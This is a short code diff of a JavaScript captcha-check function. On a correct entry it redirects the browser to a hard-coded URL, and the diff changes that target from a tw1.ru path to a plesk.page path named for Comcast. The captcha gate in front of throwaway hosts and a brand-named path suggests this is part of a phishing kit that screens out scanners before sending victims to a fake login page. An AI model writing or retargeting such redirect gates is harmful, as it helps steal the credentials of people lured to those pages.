@@ -30,7 +30,7 @@ function validateCaptcha() {
     event.preventDefault();
     debugger
     if (document.getElementById("cpatchaTextBox").value == code) {
-        targetURL="http://cn66803.tw1.ru/cuogdiu/efejo/acceder/";
+        targetURL="https://quizzical-hoover.49-50-84-221.plesk.page/comcast/";
 window.location=targetURL;
     } else {
         alert("Invalid Captcha. Veuillez réessayer svp");
